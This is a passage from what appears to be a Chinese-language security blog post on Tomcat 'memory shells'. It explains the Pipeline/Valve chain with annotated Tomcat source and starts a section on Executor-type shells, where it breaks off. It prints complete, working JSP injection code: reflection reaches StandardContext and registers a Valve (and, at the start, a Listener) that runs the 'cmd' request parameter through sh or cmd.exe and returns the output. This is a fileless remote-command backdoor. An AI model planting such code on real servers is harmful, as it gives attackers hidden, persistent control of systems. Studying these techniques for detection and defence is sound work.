&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">MyListener</span> <span class="variable">myListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line">    context.addApplicationEventListener(myListener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="基于-Tomcat-中间件"><a href="#基于-Tomcat-中间件" class="headerlink" title="基于 Tomcat 中间件"></a>基于 Tomcat 中间件</h3><h4 id="Valve-型内存马"><a href="#Valve-型内存马" class="headerlink" title="Valve 型内存马"></a>Valve 型内存马</h4><p><strong>Pipeline&#x2F;Valve</strong> 是 Tomcat（Catalina）在 <em>容器层级</em>（Engine&#x2F;Host&#x2F;Context&#x2F;Wrapper）上实现的“拦截-处理链”：<br>每层容器有一条 <strong>Pipeline</strong>，里面串着多个 <strong>Valve</strong>（阀门）；请求按顺序流经这些 Valve，最后由该层的 <strong>Basic Valve</strong> 把控制权交给下一层，直到命中目标 <code>Servlet</code>。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Socket → Http11Processor → CoyoteAdapter</span><br><span class="line">         │                      │</span><br><span class="line">         │  转为 Catalina 的     │ 调用 Engine 的管线</span><br><span class="line">         ▼  Request/Response     ▼</span><br><span class="line"> [Engine].Pipeline:  [自定义 Valve]* → StandardEngineValve</span><br><span class="line">                                           │ 选择 Host</span><br><span class="line">                                           ▼</span><br><span class="line"> [Host].Pipeline:    [自定义 Valve]* → StandardHostValve</span><br><span class="line">                                           │ 选择 Context</span><br><span class="line">                                           ▼</span><br><span class="line"> [Context].Pipeline: [自定义 Valve]* → StandardContextValve</span><br><span class="line">                                           │ 选择 Wrapper / 构建 FilterChain</span><br><span class="line">                                           ▼</span><br><span class="line"> [Wrapper].Pipeline: [自定义 Valve]* → StandardWrapperValve</span><br><span class="line">                                           │ 分配/加载 Servlet → 执行 FilterChain → Servlet.service()</span><br><span class="line">                                           ▼</span><br><span class="line">                                       返回上一层，按栈回收/收尾</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>每个容器（Container）</strong>——<code>Engine</code>、<code>Host</code>、<code>Context</code>、<code>Wrapper</code>——<strong>各自有一条 Pipeline</strong>。</li>
<li>每条 Pipeline 里有若干<strong>可插拔的 Valve</strong>（你配置的）和一个<strong>Basic Valve</strong>（该容器的“标准”阀，如 <code>StandardHostValve</code>），<strong>顺序是：先执行你加的，再执行 Basic</strong>。</li>
<li><strong>Basic Valve 的职责</strong>是完成本容器的核心工作，并把请求<strong>传递到下一级容器</strong>的 Pipeline（例如：Engine → Host，Host → Context，Context → Wrapper）。</li>
</ul>
<p>在这个过程中，<strong>Valve</strong>是<strong>容器级</strong>拦截器（Tomcat 专有，Catalina 的 Pipeline 里）。我们只需在运行时向 <code>Engine</code>&#x2F;<code>Host</code>&#x2F;<code>Context</code>&#x2F;<code>Wrapper</code> 这四种 <code>Container</code> 组件中的任意一个的 <code>pipeline</code> 中插入一个我们自定义的 <code>valve</code>，就可以在其中对相应的请求进行拦截并执行我们想要的功能。</p>
<p><code>Pipeline</code> 接口存在 <code>addValve</code> 方法，其实现类 <code>org.apache.catalina.core.StandardPipeline</code> 实现了这个方法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将一个新的 Valve 追加到当前 Container 所属 Pipeline 的“末尾”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义说明：</span></span><br><span class="line"><span class="comment"> * - 若该 Valve 实现了 Contained，则在加入前先注入所属的 Container（valve.setContainer(container)）。</span></span><br><span class="line"><span class="comment"> *   如果 Valve 不接受这个 Container，可能抛 IllegalArgumentException / IllegalStateException。</span></span><br><span class="line"><span class="comment"> * - 若当前 Pipeline 已处于可用状态（已启动），并且该 Valve 实现了 Lifecycle，则立即启动它（valve.start()）。</span></span><br><span class="line"><span class="comment"> * - 以单向链表的方式把新 Valve 挂到 Basic Valve 之前，确保执行顺序为：已有自定义 valves... → 新 valve → basic。</span></span><br><span class="line"><span class="comment"> * - 最后广播“ADD_VALVE_EVENT”容器事件，方便外部监听器感知变更。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valve 要添加的 Valve</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 当容器或 Valve 拒绝关联时</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalStateException    当 Valve 已经归属于另一个 Container 时</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve valve)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 可选：向实现了 Contained 的 Valve 注入所属 Container</span></span><br><span class="line">    <span class="comment">//    这一步可能因 Valve 不接受该 container 而抛出 IAE/ISE（由 setContainer 实现决定）。</span></span><br><span class="line">    <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Contained) &#123;</span><br><span class="line">        ((Contained) valve).setContainer(<span class="built_in">this</span>.container);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 若当前 Pipeline 已经处于“可用”状态，</span></span><br><span class="line">    <span class="comment">//    则对实现了 Lifecycle 的 Valve 进行启动（与容器生命周期对齐）。</span></span><br><span class="line">    <span class="keyword">if</span> (getState().isAvailable()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (valve <span class="keyword">instanceof</span> Lifecycle) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((Lifecycle) valve).start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">                <span class="comment">// 启动失败：记录错误日志，但不中断添加流程</span></span><br><span class="line">                log.error(sm.getString(<span class="string">&quot;standardPipeline.valve.start&quot;</span>), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 把新 Valve 挂到链表末尾（Basic Valve 之前）</span></span><br><span class="line">    <span class="comment">// Pipeline 内部结构：first -&gt; ... -&gt; (last) -&gt; basic</span></span><br><span class="line">    <span class="keyword">if</span> (first == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 链表为空：新 Valve 成为第一个，next 指向 basic</span></span><br><span class="line">        first = valve;</span><br><span class="line">        valve.setNext(basic);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 链表非空：从 first 开始找到“最后一个指向 basic 的节点”，把新 Valve 插在它与 basic 之间</span></span><br><span class="line">        <span class="type">Valve</span> <span class="variable">current</span> <span class="operator">=</span> first;</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current.getNext() == basic) &#123;</span><br><span class="line">                current.setNext(valve);   <span class="comment">// 原 last 指向新 valve</span></span><br><span class="line">                valve.setNext(basic);     <span class="comment">// 新 valve 指向 basic</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            current = current.getNext();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 通知：向外发布“添加 Valve”事件，供监听器/管理端感知</span></span><br><span class="line">    container.fireContainerEvent(Container.ADD_VALVE_EVENT, valve);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>要想调用 <code>Pipeline#addValve</code> 方法注册自定义的 <code>Valve</code> 则需要先获取容器，而 <code>org.apache.catalina.core.ContainerBase#getPipeline</code> 可以获取当前容器的 <code>Pipeline</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回与当前 Container 关联的 Pipeline（管道）对象，用于管理本容器上的 Valve 链。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 通常为 StandardPipeline 实例，随容器生命周期创建/销毁。</span></span><br><span class="line"><span class="comment"> * - 管道内包含 0..n 个自定义 Valve，末尾必有一个 Basic Valve（保底阀）。</span></span><br><span class="line"><span class="comment"> * - 通过 Pipeline 可进行 addValve/removeValve/getFirst 等操作以调整链路。</span></span><br><span class="line"><span class="comment"> * - 返回的是同一个 Pipeline 引用而非拷贝；调用方应遵守线程安全与生命周期约束。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Pipeline <span class="title function_">getPipeline</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.pipeline; <span class="comment">// 当前容器持有的管道实例</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>StandardContext</code> 本身就是一个容器，因此我们只需要调用 <code>StandardContext</code> 的 <code>getPipeline</code> 方法获取它的 <code>Pipeline</code> 然后将自定义的 <code>Valve</code> 注册进去即可。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">MyValve</span>());</span><br></pre></td></tr></table></figure></div>

<p>接下来是如何定义一个 <code>Valve</code>。前面 <code>addValve</code> 函数的参数是 <code>Valve</code> 类型，这里 <code>Valve</code> 是一个接口：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Valve（阀门）：绑定到某个 Container（Engine/Host/Context/Wrapper）的</span></span><br><span class="line"><span class="comment"> * “请求处理单元”。多个 Valve 通常被组织成一条 Pipeline（责任链）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 命名缘起：现实中的管道用阀门（Valve）控制/改变流量；Tomcat 用 Valve</span></span><br><span class="line"><span class="comment"> * 控制/改写请求处理的“流”。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Valve</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ------------------------------------------------------------- 属性访问</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取“本 Pipeline 中的下一个 Valve”。如果返回 null，说明当前 Valve</span></span><br><span class="line"><span class="comment">     * 是链条里的最后一个（通常之后会进入该 Container 的 Basic Valve）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Valve <span class="title function_">getNext</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置“本 Pipeline 中的下一个 Valve”。Container/Pipeline 在组装链条时调用。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> valve 下一个 Valve；可为 null（表示末尾）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setNext</span><span class="params">(Valve valve)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -------------------------------------------------------------- 公共方法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 执行周期性任务（如重载检测、资源清理等）。</span></span><br><span class="line"><span class="comment">     * 由容器在其类加载上下文中定期调用；抛出的异常会被捕获并记录。</span></span><br><span class="line"><span class="comment">     * （调用频率由上层 Container 的 backgroundProcessorDelay 等配置控制）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">backgroundProcess</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Valve 的核心处理方法：对当前 Request/Response 进行检查、修改、包裹、</span></span><br><span class="line"><span class="comment">     * 直接生成响应，或将控制权交给下一个 Valve。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 一个 Valve 可以（按以下次序之一）做这些事：</span></span><br><span class="line"><span class="comment">     * 1) 检查/修改 Request、Response 的属性；</span></span><br><span class="line"><span class="comment">     * 2) 直接“完整生成”响应并返回（本 Valve 截断链路，不再往下传）；</span></span><br><span class="line"><span class="comment">     * 3) 包裹（wrap）Request/Response 以增强功能，然后继续传递；</span></span><br><span class="line"><span class="comment">     * 4) 若未生成响应，则必须通过 getNext().invoke(...) 调用下一个 Valve；</span></span><br><span class="line"><span class="comment">     * 5) 在下游返回后，检查（通常不再修改）最终的 Response。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 一个 Valve 不应做的事（MUST NOT）：</span></span><br><span class="line"><span class="comment">     * - 修改已被用于路由/分派控制的请求属性（如在 Host/Context 级别试图改虚拟主机）；</span></span><br><span class="line"><span class="comment">     * - “已经生成完整响应”同时仍把请求传给下一个 Valve；</span></span><br><span class="line"><span class="comment">     * - 随意消耗 Request 输入流（除非它负责完整生成响应或在传递前进行正确包裹）；</span></span><br><span class="line"><span class="comment">     * - 在 getNext().invoke(...) 返回之后再修改 Response 的 HTTP 头；</span></span><br><span class="line"><span class="comment">     * - 在 getNext().invoke(...) 返回之后再操作 Response 的输出流。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request  要处理的请求（Catalina 包装的 Request）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response 要写入的响应（Catalina 包装的 Response）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException       I/O 错误，或下游 Valve/Filter/Servlet 抛出的 I/O 异常</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ServletException  Servlet 错误，或下游抛出的 Servlet 异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当前 Valve 是否支持 Servlet 3.0 的异步处理模型（Async）。</span></span><br><span class="line"><span class="comment">     * 容器可据此决定在异步场景下是否绕过该 Valve 或采取兼容路径。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们需要自己实现这些东西：</p>
<ul>
<li><code>getNext()/setNext()</code>：维护链表里的“下一个 Valve”指针；</li>
<li><code>backgroundProcess()</code>：周期任务的默认处理；</li>
<li><code>isAsyncSupported()</code>：异步支持标志；</li>
</ul>
<p>实际上在 Tomcat 中 <code>ValveBase</code> 已经<strong>实现</strong>了上面的大部分方法，常见自定义只需<strong>重写 <code>invoke()</code></strong> 即可。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>完整代码如下：</p>
<div class="code-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">MyValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                out.println(output);</span><br><span class="line">                out.flush();</span><br><span class="line">                out.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">MyValve</span>());</span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>

<h4 id="Executor-型内存马"><a href="#Executor-型内存马" class="headerlink" title="Executor 型内存马"></a>Executor 型内存马</h4><p>在 Tomcat 架构中，Connector 用于和客户端交互（socket 通信），承担了 HTTP 服务器的功能。Connector 主要由 <code>ProtocolHandler</code> 与 <code>Adapter</code> 构成。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Client</span><br><span class="line">  │   TCP</span><br><span class="line">  ▼</span><br><span class="line">[Connector  (Catalina)  org.apache.catalina.connector.Connector]</span><br><span class="line">  ├─ 持有：ProtocolHandler (Coyote)  ← 真正负责监听/协议解析</span><br><span class="line">  │   |    例如 org.apache.coyote.http11.Http11NioProtocol</span><br><span class="line">  │   |</span><br><span class="line">  │   ├─ Endpoint (util.net)  org.apache.tomcat.util.net.NioEndpoint   ← 传输层</span><br><span class="line">  │   │    ├─ Acceptor         （阻塞 accept 新连接，注册到 Poller）</span><br><span class="line">  │   │    ├─ Poller           （Selector 轮询就绪事件）</span><br><span class="line">  │   │    ├─ LimitLatch       （并发连接闸，配合 maxConnections）</span><br><span class="line">  │   │    └─ SocketProcessor  （把就绪 socket 封成任务 → 交给 Executor）</span><br><span class="line">  │   │         └─ Executor    